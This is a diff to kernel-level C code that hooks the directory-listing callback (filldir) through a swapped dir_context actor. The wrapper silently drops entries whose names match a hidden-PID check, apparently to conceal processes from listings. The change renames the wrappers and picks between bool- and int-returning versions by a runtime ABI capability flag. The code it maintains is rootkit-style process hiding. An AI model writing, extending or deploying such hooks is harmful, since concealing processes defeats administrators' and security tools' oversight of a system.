@@ -8,11 +8,11 @@
 struct dir_context;
 
 /* filldir changed its return type in 6.1; both KCFI types must survive. */
-typedef int (*neverc_krt_filldir_legacy_fn)(struct dir_context *ctx,
+typedef int (*neverc_krt_filldir_returns_int_fn)(struct dir_context *ctx,
 					    const char *name, int namlen,
 					    loff_t offset, u64 ino,
 					    unsigned int type);
-typedef bool (*neverc_krt_filldir_modern_fn)(struct dir_context *ctx,
+typedef bool (*neverc_krt_filldir_returns_bool_fn)(struct dir_context *ctx,
 					     const char *name, int namlen,
 					     loff_t offset, u64 ino,
 					     unsigned int type);
@@ -111,31 +111,31 @@ static int _neverc_krt_pid_name_hidden(const char *name, int namlen)
 	return 0;
 }
 
-static int _neverc_krt_pid_filldir_legacy(struct dir_context *ctx,
+static int _neverc_krt_pid_filldir_returns_int(struct dir_context *ctx,
 					  const char *name, int namlen,
 					  loff_t offset, u64 ino,
 					  unsigned int type)
 {
-	neverc_krt_filldir_legacy_fn orig;
+	neverc_krt_filldir_returns_int_fn orig;
 
 	if (_neverc_krt_pid_name_hidden(name, namlen))
 		return 0;
-	orig = (neverc_krt_filldir_legacy_fn)_neverc_krt_pid_actor_get_orig();
+	orig = (neverc_krt_filldir_returns_int_fn)_neverc_krt_pid_actor_get_orig();
 	if (orig)
 		return orig(ctx, name, namlen, offset, ino, type);
 	return 0;
 }
 
-static bool _neverc_krt_pid_filldir_modern(struct dir_context *ctx,
+static bool _neverc_krt_pid_filldir_returns_bool(struct dir_context *ctx,
 					   const char *name, int namlen,
 					   loff_t offset, u64 ino,
 					   unsigned int type)
 {
-	neverc_krt_filldir_modern_fn orig;
+	neverc_krt_filldir_returns_bool_fn orig;
 
 	if (_neverc_krt_pid_name_hidden(name, namlen))
 		return false;
-	orig = (neverc_krt_filldir_modern_fn)_neverc_krt_pid_actor_get_orig();
+	orig = (neverc_krt_filldir_returns_bool_fn)_neverc_krt_pid_actor_get_orig();
 	if (orig)
 		return orig(ctx, name, namlen, offset, ino, type);
 	return false;
@@ -148,17 +148,25 @@ static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
 
 	void *actor;
 	void *wrap;
-	int kernel_ver;
+	const struct neverc_krt_runtime_caps *caps;
 
 	if (neverc_krt_mem_read(&actor, (void *)dir_ctx_ptr, 8))
 		return;
 	if (!actor) return;
 
-	kernel_ver = __atomic_load_n(&_neverc_krt_kernel_ver, __ATOMIC_ACQUIRE);
-	if (kernel_ver >= 601)
-		wrap = (void *)_neverc_krt_pid_filldir_modern;
-	else
-		wrap = (void *)_neverc_krt_pid_filldir_legacy;
+	caps = _neverc_krt_current_caps();
+	if (!caps)
+		return;
+	switch (caps->filldir_abi) {
+	case NEVERC_KRT_FILLDIR_ABI_RETURNS_BOOL:
+		wrap = (void *)_neverc_krt_pid_filldir_returns_bool;
+		break;
+	case NEVERC_KRT_FILLDIR_ABI_RETURNS_INT:
+		wrap = (void *)_neverc_krt_pid_filldir_returns_int;
+		break;
+	default:
+		return;
+	}
 	if (actor == wrap)
 		return;
 
